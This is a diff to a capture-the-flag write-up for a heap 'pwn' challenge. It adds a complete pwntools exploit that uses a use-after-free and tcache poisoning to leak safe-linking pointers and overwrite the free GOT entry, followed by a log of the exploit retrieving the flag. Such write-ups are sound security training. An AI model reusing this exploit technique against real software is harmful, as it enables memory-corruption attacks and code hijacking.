@@ -579,7 +579,7 @@ skid@TheGreen:~/ctfs/new/pwn$
 
 **first look + sec check**
 
-```
+```bash
 skid@TheGreen:~/ctfs/new/pwn$ ls
 ld-linux-x86-64.so.2  ledger  libc.so.6  README.txt
 skid@TheGreen:~/ctfs/new/pwn$ ./ledger
@@ -603,7 +603,7 @@ skid@TheGreen:~/ctfs/new/pwn$
 
 **Decompile in ghidra**
 
-```
+```c
 ====================================================================================================
 FUNCTION: audit
 ADDRESS : 004012b6
@@ -738,4 +738,92 @@ undefined8 main(void)
 }
 ```
 
-****
+**UAF - tcache poisoning.. writing exploit for it..**
+
+```py
+#!/usr/bin/env python3
+import sys
+import struct
+from pwn import *
+
+context.binary = elf = ELF('./ledger', checksec=False)
+
+AUDIT    = 0x4012B6
+FREE_GOT = elf.got['free']
+NOTES    = elf.symbols['notes']
+CHUNK    = 0x60
+
+if len(sys.argv) == 3:
+    ip, port = sys.argv[1], int(sys.argv[2])
+    p = remote(ip, port)
+else:
+    p = process('./ledger')
+
+def add(idx, data):
+    p.sendlineafter(b'> ', b'1')
+    p.sendlineafter(b'index: ', str(idx).encode())
+    p.sendafter(b'note: ', data)
+
+def delete(idx):
+    p.sendlineafter(b'> ', b'2')
+    p.sendlineafter(b'index: ', str(idx).encode())
+
+def edit(idx, data):
+    p.sendlineafter(b'> ', b'3')
+    p.sendlineafter(b'index: ', str(idx).encode())
+    p.sendafter(b'note: ', data)
+
+def view(idx):
+    p.sendlineafter(b'> ', b'4')
+    p.sendlineafter(b'index: ', str(idx).encode())
+    return p.recv(0x50)
+
+add(0, b'A' * 8)
+add(1, b'B' * 8)
+
+delete(0)                                   
+leak_a = u64(view(0)[:8])
+log.info(f"A>>12       = {hex(leak_a)}")
+
+delete(1)                              
+leak_b = u64(view(1)[:8])
+log.info(f"(B>>12)^A   = {hex(leak_b)}")
+
+A = leak_a ^ leak_b                      
+B = A + CHUNK
+log.info(f"A = {hex(A)}  B = {hex(B)}")
+
+enc = (B >> 12) ^ NOTES
+edit(1, p64(enc))
+
+add(2, b'C' * 8)
+
+fake = p64(FREE_GOT) + b'\x00' * (0x50 - 8)
+add(3, fake)
+
+edit(0, p64(AUDIT))
+
+delete(0)
+
+print(p.recvall(timeout=3).decode(errors='replace'))
+```
+
+**running exploit..**
+
+```
+skid@TheGreen:~/ctfs/new/pwn$ python3 e.py
+[+] Starting local process './ledger': pid 4495
+[*] A>>12       = 0x710a
+[*] (B>>12)^A   = 0x710d3ba
+[*] A = 0x710a2b0  B = 0x710a310
+[+] Receiving all data: Done (76B)
+[*] Stopped process './ledger' (pid 4495)
+[audit] flag{congruletion}
+
+
+1) add  2) delete  3) edit  4) view  5) exit
+>
+skid@TheGreen:~/ctfs/new/pwn$
+```
+
+---
